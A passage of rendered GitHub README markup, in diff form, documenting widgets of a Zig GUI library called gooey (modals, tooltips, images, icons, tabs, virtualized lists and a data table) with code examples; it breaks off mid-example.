+<p dir="auto">The widget manages open/close state internally — no toggle/close handlers or per-option handler arrays needed. Just provide <code>on_select</code> and a single handler that receives the selected index.</p>
+<blockquote>
+<p dir="auto"><strong>Legacy API:</strong> The explicit <code>is_open</code> / <code>on_toggle_handler</code> / <code>on_close_handler</code> / <code>handlers</code> fields are still supported for full manual control.</p>
+</blockquote>
+<p dir="auto"><h3 tabindex="-1" dir="auto">Modal</h3><a aria-label="Permalink: Modal" href="#modal" id="user-content-modal"></a></p>
+<div dir="auto" data-snippet-clipboard-copy-content="const State = struct {
+    show_confirm: bool = false,
+
+    pub fn openConfirm(self: *State) void {
+        self.show_confirm = true;
+    }
+
+    pub fn closeConfirm(self: *State) void {
+        self.show_confirm = false;
+    }
+};
+
+// Trigger button
+Button{ .label = &#34;Delete Item&#34;, .variant = .danger, .on_click_handler = cx.update(State.openConfirm) }
+
+// Modal with custom content
+Modal(ConfirmContent){
+    .id = &#34;confirm-dialog&#34;,
+    .is_open = s.show_confirm,
+    .on_close = cx.update(State.closeConfirm),
+    .child = ConfirmContent{
+        .message = &#34;Are you sure you want to delete?&#34;,
+        .on_confirm = cx.update(State.doDelete),
+        .on_cancel = cx.update(State.closeConfirm),
+    },
+    .animate = true,
+    .close_on_backdrop = true,
+}"><pre><span>const</span> <span>State</span> <span>=</span> <span>struct</span> {
+    <span>show_confirm</span>: <span>bool</span> <span>=</span> <span>false</span>,
+
+    <span>pub</span> <span>fn</span> <span>openConfirm</span>(<span>self</span>: <span>*</span><span>State</span>) <span>void</span> {
+        <span>self</span>.<span>show_confirm</span> <span>=</span> <span>true</span>;
+    }
+
+    <span>pub</span> <span>fn</span> <span>closeConfirm</span>(<span>self</span>: <span>*</span><span>State</span>) <span>void</span> {
+        <span>self</span>.<span>show_confirm</span> <span>=</span> <span>false</span>;
+    }
+};
+
+<span>// Trigger button</span>
+<span>Button</span>{ .<span>label</span> <span>=</span> <span>&#34;Delete Item&#34;</span>, .<span>variant</span> <span>=</span> <span>.danger</span>, .<span>on_click_handler</span> <span>=</span> <span>cx</span>.<span>update</span>(<span>State</span>.<span>openConfirm</span>) }
+
+<span>// Modal with custom content</span>
+<span>Modal</span>(<span>ConfirmContent</span>){
+    .<span>id</span> <span>=</span> <span>&#34;confirm-dialog&#34;</span>,
+    .<span>is_open</span> <span>=</span> <span>s</span>.<span>show_confirm</span>,
+    .<span>on_close</span> <span>=</span> <span>cx</span>.<span>update</span>(<span>State</span>.<span>closeConfirm</span>),
+    .<span>child</span> <span>=</span> <span>ConfirmContent</span>{
+        .<span>message</span> <span>=</span> <span>&#34;Are you sure you want to delete?&#34;</span>,
+        .<span>on_confirm</span> <span>=</span> <span>cx</span>.<span>update</span>(<span>State</span>.<span>doDelete</span>),
+        .<span>on_cancel</span> <span>=</span> <span>cx</span>.<span>update</span>(<span>State</span>.<span>closeConfirm</span>),
+    },
+    .<span>animate</span> <span>=</span> <span>true</span>,
+    .<span>close_on_backdrop</span> <span>=</span> <span>true</span>,
+}</pre></div>
+<p dir="auto"><h3 tabindex="-1" dir="auto">Tooltip</h3><a aria-label="Permalink: Tooltip" href="#tooltip" id="user-content-tooltip"></a></p>
+<div dir="auto" data-snippet-clipboard-copy-content="// Wrap any component with a tooltip
+Tooltip(Button){
+    .text = &#34;Click to save your changes&#34;,
+    .child = Button{ .label = &#34;Save&#34;, .on_click_handler = ... },
+    .position = .top,  // .top, .bottom, .left, .right
+}
+
+// With custom styling
+Tooltip(IconButton){
+    .text = &#34;This field is required&#34;,
+    .child = HelpIcon{},
+    .position = .right,
+    .max_width = 200,
+    .background = Color.rgb(0.2, 0.2, 0.25),
+}"><pre><span>// Wrap any component with a tooltip</span>
+<span>Tooltip</span>(<span>Button</span>){
+    .<span>text</span> <span>=</span> <span>&#34;Click to save your changes&#34;</span>,
+    .<span>child</span> <span>=</span> <span>Button</span>{ .<span>label</span> <span>=</span> <span>&#34;Save&#34;</span>, .<span>on_click_handler</span> <span>=</span> <span>...</span> },
+    .<span>position</span> <span>=</span> <span>.top</span>,  <span>// .top, .bottom, .left, .right</span>
+}
+
+<span>// With custom styling</span>
+<span>Tooltip</span>(<span>IconButton</span>){
+    .<span>text</span> <span>=</span> <span>&#34;This field is required&#34;</span>,
+    .<span>child</span> <span>=</span> <span>HelpIcon</span>{},
+    .<span>position</span> <span>=</span> <span>.right</span>,
+    .<span>max_width</span> <span>=</span> <span>200</span>,
+    .<span>background</span> <span>=</span> <span>Color</span>.<span>rgb</span>(<span>0.2</span>, <span>0.2</span>, <span>0.25</span>),
+}</pre></div>
+<p dir="auto"><h3 tabindex="-1" dir="auto">Image</h3><a aria-label="Permalink: Image" href="#image" id="user-content-image"></a></p>
+<div dir="auto" data-snippet-clipboard-copy-content="// Simple image from path
+gooey.Image{ .src = &#34;assets/logo.png&#34; }
+
+// With explicit sizing
+gooey.Image{ .src = &#34;photo.jpg&#34;, .width = 200, .height = 150 }
+
+// Rounded avatar
+gooey.Image{ .src = &#34;avatar.png&#34;, .size = 48, .rounded = true }
+
+// Cover image (fills container, may crop)
+gooey.Image{ .src = &#34;banner.jpg&#34;, .width = 800, .height = 200, .fit = .cover }
+
+// With effects
+gooey.Image{
+    .src = &#34;icon.png&#34;,
+    .size = 64,
+    .grayscale = 1.0,           // 0.0 = color, 1.0 = grayscale
+    .tint = gooey.Color.blue,   // Color overlay
+    .opacity = 0.8,
+    .corner_radius = 8,
+}"><pre><span>// Simple image from path</span>
+<span>gooey.Image</span>{ .<span>src</span> <span>=</span> <span>&#34;assets/logo.png&#34;</span> }
+
+<span>// With explicit sizing</span>
+<span>gooey.Image</span>{ .<span>src</span> <span>=</span> <span>&#34;photo.jpg&#34;</span>, .<span>width</span> <span>=</span> <span>200</span>, .<span>height</span> <span>=</span> <span>150</span> }
+
+<span>// Rounded avatar</span>
+<span>gooey.Image</span>{ .<span>src</span> <span>=</span> <span>&#34;avatar.png&#34;</span>, .<span>size</span> <span>=</span> <span>48</span>, .<span>rounded</span> <span>=</span> <span>true</span> }
+
+<span>// Cover image (fills container, may crop)</span>
+<span>gooey.Image</span>{ .<span>src</span> <span>=</span> <span>&#34;banner.jpg&#34;</span>, .<span>width</span> <span>=</span> <span>800</span>, .<span>height</span> <span>=</span> <span>200</span>, .<span>fit</span> <span>=</span> <span>.cover</span> }
+
+<span>// With effects</span>
+<span>gooey.Image</span>{
+    .<span>src</span> <span>=</span> <span>&#34;icon.png&#34;</span>,
+    .<span>size</span> <span>=</span> <span>64</span>,
+    .<span>grayscale</span> <span>=</span> <span>1.0</span>,           <span>// 0.0 = color, 1.0 = grayscale</span>
+    .<span>tint</span> <span>=</span> <span>gooey</span>.<span>Color</span>.<span>blue</span>,   <span>// Color overlay</span>
+    .<span>opacity</span> <span>=</span> <span>0.8</span>,
+    .<span>corner_radius</span> <span>=</span> <span>8</span>,
+}</pre></div>
+<p dir="auto"><h3 tabindex="-1" dir="auto">SVG Icons</h3><a aria-label="Permalink: SVG Icons" href="#svg-icons" id="user-content-svg-icons"></a></p>
+<div dir="auto" data-snippet-clipboard-copy-content="const gooey = @import(&#34;gooey&#34;);
+const Svg = gooey.Svg;
+const Icons = gooey.Icons;
+
+// Using built-in icon paths
+Svg{ .path = Icons.star, .size = 24, .color = Color.gold }
+Svg{ .path = Icons.check, .size = 20, .color = Color.green }
+Svg{ .path = Icons.close, .size = 16, .color = Color.red }
+
+// Stroked icon (outline only)
+Svg{ .path = Icons.star_outline, .size = 24, .stroke_color = Color.white, .stroke_width = 2 }
+
+// Both fill and stroke
+Svg{ .path = Icons.favorite, .size = 24, .color = Color.red, .stroke_color = Color.black, .stroke_width = 1 }
+
+// Available icons: arrow_back, arrow_forward, menu, close, more_vert,
+// check, add, remove, edit, delete, search, star, star_outline, favorite,
+// info, warning, error_icon, play, pause, skip_next, skip_prev, volume_up,
+// visibility, visibility_off, folder, file, download, upload"><pre><span>const</span> <span>gooey</span> <span>=</span> <span>@import</span>(<span>&#34;gooey&#34;</span>);
+<span>const</span> <span>Svg</span> <span>=</span> <span>gooey</span>.<span>Svg</span>;
+<span>const</span> <span>Icons</span> <span>=</span> <span>gooey</span>.<span>Icons</span>;
+
+<span>// Using built-in icon paths</span>
+<span>Svg</span>{ .<span>path</span> <span>=</span> <span>Icons</span>.<span>star</span>, .<span>size</span> <span>=</span> <span>24</span>, .<span>color</span> <span>=</span> <span>Color</span>.<span>gold</span> }
+<span>Svg</span>{ .<span>path</span> <span>=</span> <span>Icons</span>.<span>check</span>, .<span>size</span> <span>=</span> <span>20</span>, .<span>color</span> <span>=</span> <span>Color</span>.<span>green</span> }
+<span>Svg</span>{ .<span>path</span> <span>=</span> <span>Icons</span>.<span>close</span>, .<span>size</span> <span>=</span> <span>16</span>, .<span>color</span> <span>=</span> <span>Color</span>.<span>red</span> }
+
+<span>// Stroked icon (outline only)</span>
+<span>Svg</span>{ .<span>path</span> <span>=</span> <span>Icons</span>.<span>star_outline</span>, .<span>size</span> <span>=</span> <span>24</span>, .<span>stroke_color</span> <span>=</span> <span>Color</span>.<span>white</span>, .<span>stroke_width</span> <span>=</span> <span>2</span> }
+
+<span>// Both fill and stroke</span>
+<span>Svg</span>{ .<span>path</span> <span>=</span> <span>Icons</span>.<span>favorite</span>, .<span>size</span> <span>=</span> <span>24</span>, .<span>color</span> <span>=</span> <span>Color</span>.<span>red</span>, .<span>stroke_color</span> <span>=</span> <span>Color</span>.<span>black</span>, .<span>stroke_width</span> <span>=</span> <span>1</span> }
+
+<span>// Available icons: arrow_back, arrow_forward, menu, close, more_vert,</span>
+<span>// check, add, remove, edit, delete, search, star, star_outline, favorite,</span>
+<span>// info, warning, error_icon, play, pause, skip_next, skip_prev, volume_up,</span>
+<span>// visibility, visibility_off, folder, file, download, upload</span></pre></div>
+<p dir="auto"><h3 tabindex="-1" dir="auto">ProgressBar</h3><a aria-label="Permalink: ProgressBar" href="#progressbar" id="user-content-progressbar"></a></p>
+<div dir="auto" data-snippet-clipboard-copy-content="ProgressBar{
+    .progress = s.completion,  // 0.0 to 1.0
+    .width = 200,
+    .height = 8,
+    .corner_radius = 4,
+}"><pre><span>ProgressBar</span>{
+    .<span>progress</span> <span>=</span> <span>s</span>.<span>completion</span>,  <span>// 0.0 to 1.0</span>
+    .<span>width</span> <span>=</span> <span>200</span>,
+    .<span>height</span> <span>=</span> <span>8</span>,
+    .<span>corner_radius</span> <span>=</span> <span>4</span>,
+}</pre></div>
+<p dir="auto"><h3 tabindex="-1" dir="auto">Tabs</h3><a aria-label="Permalink: Tabs" href="#tabs" id="user-content-tabs"></a></p>
+<div dir="auto" data-snippet-clipboard-copy-content="// Individual tabs for custom navigation
+cx.render(ui.hstack(.{ .gap = 4 }, .{
+    Tab{
+        .label = &#34;Home&#34;,
+        .is_active = s.tab == 0,
+        .on_click_handler = cx.updateWith(@as(u8, 0), State.setTab),
+    },
+    Tab{
+        .label = &#34;Settings&#34;,
+        .is_active = s.tab == 1,
+        .on_click_handler = cx.updateWith(@as(u8, 1), State.setTab),
+        .style = .underline,  // .pills (default), .underline, .segmented
+    },
+}))"><pre><span>// Individual tabs for custom navigation</span>
+<span>cx</span>.<span>render</span>(<span>ui</span>.<span>hstack</span>(.{ .<span>gap</span> <span>=</span> <span>4</span> }, .{
+    <span>Tab</span>{
+        .<span>label</span> <span>=</span> <span>&#34;Home&#34;</span>,
+        .<span>is_active</span> <span>=</span> <span>s</span>.<span>tab</span> <span>==</span> <span>0</span>,
+        .<span>on_click_handler</span> <span>=</span> <span>cx</span>.<span>updateWith</span>(<span>@as</span>(<span>u8</span>, <span>0</span>), <span>State</span>.<span>setTab</span>),
+    },
+    <span>Tab</span>{
+        .<span>label</span> <span>=</span> <span>&#34;Settings&#34;</span>,
+        .<span>is_active</span> <span>=</span> <span>s</span>.<span>tab</span> <span>==</span> <span>1</span>,
+        .<span>on_click_handler</span> <span>=</span> <span>cx</span>.<span>updateWith</span>(<span>@as</span>(<span>u8</span>, <span>1</span>), <span>State</span>.<span>setTab</span>),
+        .<span>style</span> <span>=</span> <span>.underline</span>,  <span>// .pills (default), .underline, .segmented</span>
+    },
+}))</pre></div>
+<p dir="auto"><h3 tabindex="-1" dir="auto">UniformList</h3><a aria-label="Permalink: UniformList" href="#uniformlist" id="user-content-uniformlist"></a></p>
+<p dir="auto">Virtualized list for efficiently rendering large datasets with uniform item heights. Only visible items are rendered, regardless of total count. The render callback receives <code>*Cx</code> for full access to state and handlers.</p>
+<div dir="auto" data-snippet-clipboard-copy-content="const State = struct {
+    list_state: UniformListState = UniformListState.init(10_000, 32.0), // count, item height
+    selected: ?u32 = null,
+
+    pub fn scrollToTop(self: *State) void {
+        self.list_state.scrollToTop();
+    }
+
+    pub fn scrollToMiddle(self: *State) void {
+        self.list_state.scrollToItem(5000, .center);
+    }
+
+    pub fn selectItem(self: *State, index: u32) void {
+        self.selected = index;
+    }
+};
+
+// In render function:
+fn render(cx: *Cx) void {
+    const s = cx.state(State);
+    cx.uniformList(&#34;my-list&#34;, &amp;s.list_state, .{
+        .fill_width = true,
+        .grow_height = true,
+    }, renderItem);
+}
+
+fn renderItem(index: u32, cx: *Cx) void {
+    const s = cx.stateConst(State);
+    const theme = cx.theme();
+    const is_selected = if (s.selected) |sel| sel == index else false;
+
+    // Color is available via: const Color = gooey.Color;
+    const text_color = if (is_selected) Color.white else theme.text;
+
+    cx.render(ui.box(.{
+        .fill_width = true,
+        .height = 32,
+        .background = if (is_selected) theme.primary else null,
+        .hover_background = theme.overlay,
+        .on_click_handler = cx.updateWith(index, State.selectItem),
+    }, .{
+        ui.text(&#34;Item&#34;, .{ .color = text_color }),
+    }));
+}"><pre><span>const</span> <span>State</span> <span>=</span> <span>struct</span> {
+    <span>list_state</span>: <span>UniformListState</span> <span>=</span> <span>UniformListState</span>.<span>init</span>(<span>10_000</span>, <span>32.0</span>), <span>// count, item height</span>
+    <span>selected</span>: <span>?</span><span>u32</span> <span>=</span> <span>null</span>,
+
+    <span>pub</span> <span>fn</span> <span>scrollToTop</span>(<span>self</span>: <span>*</span><span>State</span>) <span>void</span> {
+        <span>self</span>.<span>list_state</span>.<span>scrollToTop</span>();
+    }
+
+    <span>pub</span> <span>fn</span> <span>scrollToMiddle</span>(<span>self</span>: <span>*</span><span>State</span>) <span>void</span> {
+        <span>self</span>.<span>list_state</span>.<span>scrollToItem</span>(<span>5000</span>, <span>.center</span>);
+    }
+
+    <span>pub</span> <span>fn</span> <span>selectItem</span>(<span>self</span>: <span>*</span><span>State</span>, <span>index</span>: <span>u32</span>) <span>void</span> {
+        <span>self</span>.<span>selected</span> <span>=</span> <span>index</span>;
+    }
+};
+
+<span>// In render function:</span>
+<span>fn</span> <span>render</span>(<span>cx</span>: <span>*</span><span>Cx</span>) <span>void</span> {
+    <span>const</span> <span>s</span> <span>=</span> <span>cx</span>.<span>state</span>(<span>State</span>);
+    <span>cx</span>.<span>uniformList</span>(<span>&#34;my-list&#34;</span>, <span>&amp;</span><span>s</span>.<span>list_state</span>, .{
+        .<span>fill_width</span> <span>=</span> <span>true</span>,
+        .<span>grow_height</span> <span>=</span> <span>true</span>,
+    }, <span>renderItem</span>);
+}
+
+<span>fn</span> <span>renderItem</span>(<span>index</span>: <span>u32</span>, <span>cx</span>: <span>*</span><span>Cx</span>) <span>void</span> {
+    <span>const</span> <span>s</span> <span>=</span> <span>cx</span>.<span>stateConst</span>(<span>State</span>);
+    <span>const</span> <span>theme</span> <span>=</span> <span>cx</span>.<span>theme</span>();
+    <span>const</span> <span>is_selected</span> <span>=</span> <span>if</span> (<span>s</span>.<span>selected</span>) <span>|</span><span>sel</span><span>|</span> <span>sel</span> <span>==</span> <span>index</span> <span>else</span> <span>false</span>;
+
+    <span>// Color is available via: const Color = gooey.Color;</span>
+    <span>const</span> <span>text_color</span> <span>=</span> <span>if</span> (<span>is_selected</span>) <span>Color</span>.<span>white</span> <span>else</span> <span>theme</span>.<span>text</span>;
+
+    <span>cx</span>.<span>render</span>(<span>ui</span>.<span>box</span>(.{
+        .<span>fill_width</span> <span>=</span> <span>true</span>,
+        .<span>height</span> <span>=</span> <span>32</span>,
+        .<span>background</span> <span>=</span> <span>if</span> (<span>is_selected</span>) <span>theme</span>.<span>primary</span> <span>else</span> <span>null</span>,
+        .<span>hover_background</span> <span>=</span> <span>theme</span>.<span>overlay</span>,
+        .<span>on_click_handler</span> <span>=</span> <span>cx</span>.<span>updateWith</span>(<span>index</span>, <span>State</span>.<span>selectItem</span>),
+    }, .{
+        <span>ui</span>.<span>text</span>(<span>&#34;Item&#34;</span>, .{ .<span>color</span> <span>=</span> <span>text_color</span> }),
+    }));
+}</pre></div>
+<p dir="auto"><h3 tabindex="-1" dir="auto">VirtualList</h3><a aria-label="Permalink: VirtualList" href="#virtuallist" id="user-content-virtuallist"></a></p>
+<p dir="auto">Virtualized list supporting variable item heights. Heights are cached after rendering for efficient scroll calculations. Ideal for chat messages or expandable rows. The callback must return the rendered height.</p>
+<div dir="auto" data-snippet-clipboard-copy-content="const State = struct {
+    list_state: VirtualListState = VirtualListState.init(1000, 48.0), // count, default height
+};
+
+// In render function - callback returns item height:
+fn render(cx: *Cx) void {
+    const s = cx.state(State);
+    cx.virtualList(&#34;chat-list&#34;, &amp;s.list_state, .{ .grow_height = true }, renderMessage);
+}
+
+fn renderMessage(index: u32, cx: *Cx) f32 {
+    const s = cx.stateConst(State);
+    const msg = s.messages[index];
+    const height: f32 = if (msg.has_image) 120.0 else 48.0;
+
+    cx.render(ui.box(.{
+        .fill_width = true,
+        .height = height,
+        .on_click_handler = cx.updateWith(index, State.selectMessage),
+    }, .{
+        ui.text(msg.text, .{}),
+    }));
+
+    return height; // Return actual rendered height for caching
+}"><pre><span>const</span> <span>State</span> <span>=</span> <span>struct</span> {
+    <span>list_state</span>: <span>VirtualListState</span> <span>=</span> <span>VirtualListState</span>.<span>init</span>(<span>1000</span>, <span>48.0</span>), <span>// count, default height</span>
+};
+
+<span>// In render function - callback returns item height:</span>
+<span>fn</span> <span>render</span>(<span>cx</span>: <span>*</span><span>Cx</span>) <span>void</span> {
+    <span>const</span> <span>s</span> <span>=</span> <span>cx</span>.<span>state</span>(<span>State</span>);
+    <span>cx</span>.<span>virtualList</span>(<span>&#34;chat-list&#34;</span>, <span>&amp;</span><span>s</span>.<span>list_state</span>, .{ .<span>grow_height</span> <span>=</span> <span>true</span> }, <span>renderMessage</span>);
+}
+
+<span>fn</span> <span>renderMessage</span>(<span>index</span>: <span>u32</span>, <span>cx</span>: <span>*</span><span>Cx</span>) <span>f32</span> {
+    <span>const</span> <span>s</span> <span>=</span> <span>cx</span>.<span>stateConst</span>(<span>State</span>);
+    <span>const</span> <span>msg</span> <span>=</span> <span>s</span>.<span>messages</span>[<span>index</span>];
+    <span>const</span> <span>height</span>: <span>f32</span> <span>=</span> <span>if</span> (<span>msg</span>.<span>has_image</span>) <span>120.0</span> <span>else</span> <span>48.0</span>;
+
+    <span>cx</span>.<span>render</span>(<span>ui</span>.<span>box</span>(.{
+        .<span>fill_width</span> <span>=</span> <span>true</span>,
+        .<span>height</span> <span>=</span> <span>height</span>,
+        .<span>on_click_handler</span> <span>=</span> <span>cx</span>.<span>updateWith</span>(<span>index</span>, <span>State</span>.<span>selectMessage</span>),
+    }, .{
+        <span>ui</span>.<span>text</span>(<span>msg</span>.<span>text</span>, .{}),
+    }));
+
+    <span>return</span> <span>height</span>; <span>// Return actual rendered height for caching</span>
+}</pre></div>
+<p dir="auto"><h4 tabindex="-1" dir="auto">Accurate Height Estimation with <code>measureText</code></h4><a aria-label="Permalink: Accurate Height Estimation with measureText" href="#accurate-height-estimation-with-measuretext" id="user-content-accurate-height-estimation-with-measuretext"></a></p>
+<p dir="auto">Instead of hardcoding heights or guessing character widths, use <code>cx.measureText()</code> to get pixel-accurate dimensions from the platform text shaper (CoreText/HarfBuzz/browser):</p>
+<div dir="auto" data-snippet-clipboard-copy-content="fn renderMessage(index: u32, cx: *Cx) f32 {
+    const s = cx.stateConst(State);
+    const msg = s.messages[index];
+    const padding: f32 = 32.0;
+    const max_bubble_width: f32 = 400.0;
+
+    // Measure with wrapping — uses the real shaper so kerning matches rendering
+    const m = cx.measureText(msg.text, .{
+        .max_width = max_bubble_width,
+        .font_size = 15,        // null = use the current font size
+    }) catch |_| TextMeasurement{ .width = 0, .height = 48, .line_count = 1 };
+
+    const height = m.height + padding;
+
+    cx.render(ui.box(.{
+        .fill_width = true,
+        .height = height,
+    }, .{
+        ui.text(msg.text, .{ .size = 15, .wrap = .word }),
+    }));
+
+    return height;
+}"><pre><span>fn</span> <span>renderMessage</span>(<span>index</span>: <span>u32</span>, <span>cx</span>: <span>*</span><span>Cx</span>) <span>f32</span> {
+    <span>const</span> <span>s</span> <span>=</span> <span>cx</span>.<span>stateConst</span>(<span>State</span>);
+    <span>const</span> <span>msg</span> <span>=</span> <span>s</span>.<span>messages</span>[<span>index</span>];
+    <span>const</span> <span>padding</span>: <span>f32</span> <span>=</span> <span>32.0</span>;
+    <span>const</span> <span>max_bubble_width</span>: <span>f32</span> <span>=</span> <span>400.0</span>;
+
+    <span>// Measure with wrapping — uses the real shaper so kerning matches rendering</span>
+    <span>const</span> <span>m</span> <span>=</span> <span>cx</span>.<span>measureText</span>(<span>msg</span>.<span>text</span>, .{
+        .<span>max_width</span> <span>=</span> <span>max_bubble_width</span>,
+        .<span>font_size</span> <span>=</span> <span>15</span>,        <span>// null = use the current font size</span>
+    }) <span>catch</span> <span>|</span><span>_</span><span>|</span> <span>TextMeasurement</span>{ .<span>width</span> <span>=</span> <span>0</span>, .<span>height</span> <span>=</span> <span>48</span>, .<span>line_count</span> <span>=</span> <span>1</span> };
+
+    <span>const</span> <span>height</span> <span>=</span> <span>m</span>.<span>height</span> <span>+</span> <span>padding</span>;
+
+    <span>cx</span>.<span>render</span>(<span>ui</span>.<span>box</span>(.{
+        .<span>fill_width</span> <span>=</span> <span>true</span>,
+        .<span>height</span> <span>=</span> <span>height</span>,
+    }, .{
+        <span>ui</span>.<span>text</span>(<span>msg</span>.<span>text</span>, .{ .<span>size</span> <span>=</span> <span>15</span>, .<span>wrap</span> <span>=</span> <span>.word</span> }),
+    }));
+
+    <span>return</span> <span>height</span>;
+}</pre></div>
+<p dir="auto"><code>measureText</code> returns a <code>TextMeasurement</code> with <code>.width</code>, <code>.height</code>, and <code>.line_count</code>.</p>
+<p dir="auto"><h3 tabindex="-1" dir="auto">DataTable</h3><a aria-label="Permalink: DataTable" href="#datatable" id="user-content-datatable"></a></p>
+<p dir="auto">Virtualized 2D table with both vertical and horizontal virtualization. Supports column resizing, sorting, and selection. Uses a callbacks struct for header and cell rendering.</p>
+<div dir="auto" data-snippet-clipboard-copy-content="const State = struct {
+    table_state: DataTableState = blk: {
+        var t = DataTableState.init(10_000, 32.0); // row count, row height
+        t.addColumn(.{ .width_px = 80, .sortable = true }) catch unreachable;   // ID
+        t.addColumn(.{ .width_px = 200, .sortable = true }) catch unreachable;  // Name
+        t.addColumn(.{ .width_px = 100 }) catch unreachable;                     // Status
+        break :blk t;
+    },
+
+    pub fn onHeaderClick(self: *State, col: u32) void {
+        _ = self.table_state.toggleSort(col);
+        // Re-sort your data based on table_state.sort_column and direction
+    }
+
+    pub fn onRowClick(self: *State, row: u32) void {
+        self.table_state.selection.row = row;
+    }
+};
+
+// In render function:
+fn render(cx: *Cx) void {
+    const s = cx.state(State);
+    const theme = cx.theme();
+    cx.dataTable(&#34;my-table&#34;, &amp;s.table_state, .{
+        .fill_width = true,
+        .grow_height = true,
+        .row_hover_background = theme.overlay,
+        .row_selected_background = theme.primary,
+    }, .{
+        .render_header = renderHeader,
+        .render_cell = renderCell,
+    });
+}
+
+fn renderHeader(col: u32, cx: *Cx) void {
+    const s = cx.stateConst(State);
+    const theme = cx.theme();
+
+    // Add sort indicator if this column is sorted
+    const name = COLUMN_NAMES[col];
+    const label = if (s.table_state.sort_column == col)
+        if (s.table_state.sort_direction == .ascending) name ++ &#34; ▲&#34; else name ++ &#34; ▼&#34;
+    else
+        name;
+
+    cx.render(ui.box(.{
+        .fill_width = true,
+        .fill_height = true,
+        .on_click_handler = cx.updateWith(col, State.onHeaderClick),
+    }, .{
+        ui.text(label, .{ .weight = .semibold, .color = theme.text }),
+    }));
+}
+
+fn renderCell(row: u32, col: u32, cx: *Cx) void {
+    const theme = cx.theme();
+
+    cx.render(ui.box(.{
+        .fill_width = true,
+        .fill_height = true,
+        .padding = .{ .symmetric = .{ .x = 8, .y = 0 } },
+    }, .{
+        switch (col) {
+            0 =&gt; ui.textFmt(&#34;{d}&#34;, .{row}, .{ .color = theme.text }),
+            1 =&gt; ui.text(data[row].name, .{ .color = theme.text }),
+            2 =&gt; ui.text(data[row].status, .{ .color = theme.text }),
+            else =&gt; ui.text(&#34;—&#34;, .{}),
+        },
+    }));
+}"><pre><span>const</span> <span>State</span> <span>=</span> <span>struct</span> {
+    <span>table_state</span>: <span>DataTableState</span> <span>=</span> <span>blk</span>: {
+        <span>var</span> <span>t</span> <span>=</span> <span>DataTableState</span>.<span>init</span>(<span>10_000</span>, <span>32.0</span>); <span>// row count, row height</span>
+        <span>t</span>.<span>addColumn</span>(.{ .<span>width_px</span> <span>=</span> <span>80</span>, .<span>sortable</span> <span>=</span> <span>true</span> }) <span>catch</span> <span>unreachable</span>;   <span>// ID</span>
+        <span>t</span>.<span>addColumn</span>(.{ .<span>width_px</span> <span>=</span> <span>200</span>, .<span>sortable</span> <span>=</span> <span>true</span> }) <span>catch</span> <span>unreachable</span>;  <span>// Name</span>
+        <span>t</span>.<span>addColumn</span>(.{ .<span>width_px</span> <span>=</span> <span>100</span> }) <span>catch</span> <span>unreachable</span>;                     <span>// Status</span>
+        <span>break</span> :<span>blk</span> <span>t</span>;
+    },
+
+    <span>pub</span> <span>fn</span> <span>onHeaderClick</span>(<span>self</span>: <span>*</span><span>State</span>, <span>col</span>: <span>u32</span>) <span>void</span> {
+        <span>_</span> <span>=</span> <span>self</span>.<span>table_state</span>.<span>toggleSort</span>(<span>col</span>);
+        <span>// Re-sort your data based on table_state.sort_column and direction</span>
+    }
+
+    <span>pub</span> <span>fn</span> <span>onRowClick</span>(<span>self</span>: <span>*</span><span>State</span>, <span>row</span>: <span>u32</span>) <span>void</span> {
+        <span>self</span>.<span>table_state</span>.<span>selection</span>.<span>row</span> <span>=</span> <span>row</span>;
+    }
+};
+
+<span>// In render function:</span>
+<span>fn</span> <span>render</span>(<span>cx</span>: <span>*</span><span>Cx</span>) <span>void</span> {
+    <span>const</span> <span>s</span> <span>=</span> <span>cx</span>.<span>state</span>(<span>State</span>);
+    <span>const</span> <span>theme</span> <span>=</span> <span>cx</span>.<span>theme</span>();
+    <span>cx</span>.<span>dataTable</span>(<span>&#34;my-table&#34;</span>, <span>&amp;</span><span>s</span>.<span>table_state</span>, .{
+        .<span>fill_width</span> <span>=</span> <span>true</span>,
+        .<span>grow_height</span> <span>=</span> <span>true</span>,
+        .<span>row_hover_background</span> <span>=</span> <span>theme</span>.<span>overlay</span>,
+        .<span>row_selected_background</span> <span>=</span> <span>theme</span>.<span>primary</span>,
+    }, .{
+        .<span>render_header</span> <span>=</span> <span>renderHeader</span>,
+        .<span>render_cell</span> <span>=</span> <span>renderCell</span>,
+    });
+}
+
+<span>fn</span> <span>renderHeader</span>(<span>col</span>: <span>u32</span>, <span>cx</span>: <span>*</span><span>Cx</span>) <span>void</span> {
+    <span>const</span> <span>s</span> <span>=</span> <span>cx</span>.<span>stateConst</span>(<span>State</span>);
+    <span>const</span> <span>theme</span> <span>=</span> <span>cx</span>.<span>theme</span>();
+
+    <span>// Add sort indicator if this column is sorted</span>
+    <span>const</span> <span>name</span> <span>=</span> <span>COLUMN_NAMES</span>[<span>col</span>];
+    <span>const</span> <span>label</span> <span>=</span> <span>if</span> (<span>s</span>.<span>table_state</span>.<span>sort_column</span> <span>==</span> <span>col</span>)
+        <span>if</span> (<span>s</span>.<span>table_state</span>.<span>sort_direction</span> <span>==</span> <span>.ascending</span>) <span>name</span> <span>++</span> <span>&#34; ▲&#34;</span> <span>else</span> <span>name</span> <span>++</span> <span>&#34; ▼&#34;</span>
+    <span>else</span>
+        <span>name</span>;
+
+    <span>cx</span>.<span>render</span>(<span>ui</span>.<span>box</span>(.{
+        .<span>fill_width</span> <span>=</span> <span>true</span>,
+        .<span>fill_height</span> <span>=</span> <span>true</span>,
+        .<span>on_click_handler</span> <span>=</span> <span>cx</span>.<span>updateWith</span>(<span>col</span>, <span>State</span>.<span>onHeaderClick</span>),
+    }, .{
+        <span>ui</span>.<span>text</span>(<span>label</span>, .{ .<span>weight</span> <span>=</span> <span>.semibold</span>, .<span>color</span> <span>=</span> <span>theme</span>.<span>text</span> }),
+    }));
+}
+
+<span>fn</span> <span>renderCell</span>(<span>row</span>: <span>u32</span>, <span>col</span>: <span>u32</span>, <span>cx</span>: <span>*</span><span>Cx</span>) <span>void</span> {
+    <span>const</span> <span>theme</span> <span>=</span> <span>cx</span>.<span>theme</span>();
+
+    <span>cx</span>.<span>render</span>(<span>ui</span>.<span>box</span>(.{
+        .<span>fill_width</span> <span>=</span> <span>true</span>,
+        .<span>fill_height</span> <span>=</span> <span>true</span>,
+        .<span>padding</span> <span>=</span> .{ .<span>symmetric</span> <span>=</span> .{ .<span>x</span> <span>=</span> <span>8</span>, .<span>y</span> <span>=</span> <span>0</span> } },
+    }, .{
+        <span>switch</span> (<span>col</span>) {
+            <span>0</span> <span>=</span><span>&gt;</span> <span>ui</span>.<span>textFmt</span>(<span>&#34;{d}&#34;</span>, .{<span>row</span>}, .{ .<span>color</span> <span>=</span> <span>theme</span>.<span>text</span> }),
